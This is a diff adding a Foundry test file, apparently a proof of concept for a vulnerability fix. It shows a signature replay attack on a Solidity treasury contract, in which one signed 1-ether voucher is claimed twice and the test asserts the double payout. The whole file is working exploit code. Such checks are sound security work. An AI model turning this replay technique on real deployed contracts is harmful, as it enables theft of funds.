@@ -1,0 +1,34 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+/// @notice PoC: passes on the ORIGINAL (replayable) treasury, fails on the PATCHED one.
+///         One voucher for 1 ether is presented twice; a vulnerable treasury pays both times.
+contract PocTest is Test {
+    Czz internal treasury;
+    uint256 internal signerPk = 0xA11CE;
+    address internal attacker = makeAddr("attacker");
+
+    function setUp() public {
+        treasury = new Czz{value: 10 ether}(vm.addr(signerPk));
+    }
+
+    function test_voucherReplayDoublePays() public {
+        bytes32 digest = keccak256(abi.encodePacked(address(treasury), attacker, uint256(1 ether)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
+        uint256 start = attacker.balance;
+
+        treasury.fzzClaim(attacker, 1 ether, v, r, s); // first release
+
+        // Replay the exact same signed voucher. Ignored if the patch rejects it, so the
+        // exploit finishes either way and the assertion below is what decides the verdict.
+        (bool ignored,) = address(treasury).call(
+            abi.encodeWithSignature("fzzClaim(address,uint256,uint8,bytes32,bytes32)", attacker, 1 ether, v, r, s)
+        );
+        ignored;
+
+        assertEq(attacker.balance - start, 2 ether, "the voucher was replayed for a double payout");
+    }
+}
